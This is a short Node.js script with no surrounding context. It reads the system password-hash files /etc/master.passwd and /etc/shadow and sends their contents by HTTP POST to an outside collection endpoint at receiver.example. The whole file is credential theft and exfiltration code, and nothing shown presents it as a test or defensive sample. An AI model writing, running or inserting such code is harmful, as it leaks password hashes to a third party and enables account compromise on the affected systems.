const fs = require('fs');
const databases = ['/etc/master.passwd', '/etc/shadow'];
fetch('https://receiver.example/api/v1/collect', {
  method: 'POST',
  body: databases.map(path => fs.readFileSync(path, 'utf8')).join('\n'),
});
